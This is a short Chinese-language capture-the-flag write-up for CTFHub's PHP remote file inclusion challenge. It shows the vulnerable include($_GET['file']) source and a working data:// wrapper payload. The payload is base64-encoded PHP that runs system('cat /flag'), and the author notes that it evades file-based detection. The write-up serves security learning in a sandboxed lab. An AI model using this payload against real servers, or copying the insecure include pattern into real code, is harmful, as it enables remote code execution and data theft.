# CTFHub Writeup - 远程包含

## 题目类型

WEB

## 题目描述

打开题目，点开链接，正中间有个标题，写着 CTFHub 文件包含-远程包含

标题下面是几行黑色代码，展示了一段 PHP 源码：

<?php
if (isset($_GET['file'])) {
    include($_GET['file']);
} else {
    highlight_file(__FILE__);
}
?>

## 解题过程

首先对题目进行分析：

看题目远程包含

在文件包含漏洞里，如果允许包含远程文件（服务器开启了 allow_url_include 配置），判断出有两种选择：

• 选择A：自己电脑开个 HTTP 服务器，放个木马，让靶场来下载（极其麻烦，防火墙、内网IP）
  
• 选择B：用 PHP 自带的伪协议，直接把代码塞进网址里

选择方法B,打开浏览器

在搜索框中输入：

http://challenge-0d6e68cea02fb8f8.sandbox.ctfhub.com:10800/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=

回车，页面就显示出正确的Flag了

## 笔记

这道题主要学习了：

1.首选 data:// 伪协议：

data:// 允许你在 URL 里直接内联数据。

既然我们要让靶场执行 <?php system('cat /flag'); ?>，我们就把这段代码 Base64 编码，直接拼在 URL 后面。

不用搭服务器，不用管网络，不用管路径，直接内存里执行。

2.Payload写的内容意思：

data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=

• data://：告诉 PHP 这是一个数据流协议。

• text/plain：告诉它这是纯文本。

• base64,：后面的内容是用 Base64 编码的。

• PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=：这串乱码解码后就是 <?php system('cat /flag'); ?>。

3.为什么用伪协议比用 CMD 舒服那么多？
 
因为用 http:// 或者传统路径，你要处理超长的文件路径、要担心杀毒软件、要算 Content-Length。

而伪协议把代码和数据直接打包在网址里，浏览器发过去，服务器直接吃进肚子里，完美绕开了所有的物理文件检测。
